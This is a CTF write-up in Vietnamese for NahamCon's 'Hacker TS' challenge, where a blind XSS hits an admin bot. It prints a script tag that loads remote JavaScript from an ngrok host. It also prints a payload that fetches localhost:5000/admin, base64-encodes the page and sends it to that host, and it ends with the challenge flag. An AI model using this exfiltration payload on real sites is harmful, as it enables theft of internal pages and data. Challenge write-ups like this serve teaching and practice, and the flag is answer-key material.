# nahamcon CTF - Hacker TS

## Description
We all love our hacker t-shirts. Make your own custom ones.

## Solution

### Review

![7](https://user-images.githubusercontent.com/71699412/167263496-45a82ac5-4f98-4163-84f3-c743c93d5907.jpg)


- Chall cho nhập 1 đoạn text, gửi thì redirect đến page chứa ảnh áo kèm text vừa gửi.

- Truy cập đường dẫn admin thì nó chỉ cho localhost truy cập

### Exploit

Ngồi test cả buổi cứ tưởng SSRF, Command Injection, RCE nhưng chẳng thèm thử XSS, và đúng thế, website dính lỗi XSS ở phía admin khi text ta gửi sẽ được 1 con bot go to để xem, đây là XSS blind, chơi CTF lần sau hãy chú ý nhiều hơn.

Ta gửi đoạn script sau, việc trỏ đến `a.js` giúp ta edit payload dễ hơn.
<script src="http://a047-42-112-56-248.ngrok.io/a.js"></script>

file `a.js`:
```js
var xhr = new XMLHttpRequest;
xhr.open("GET", "http://localhost:5000/admin");
xhr.onload = function() {
	var flag = btoa(xhr.responseText);
	var exit = new XMLHttpRequest;
	exit.open("GET", "http://a047-42-112-56-248.ngrok.io?flag=" + flag);
	exit.send();
};

xhr.send();
```
Đơn giản là request `localhost/admin` rồi send responseText đến server mình host thôi, nhận được response: 

![Screenshot 2022-05-07 233532](https://user-images.githubusercontent.com/71699412/167263527-e2b079d7-7f05-46e5-9f10-54ece4583072.jpg)

Decode base64 ta được flag.

Hi admin! here is your flag: <strong>flag{461e2452088eb397b6138a5934af6231}</strong>
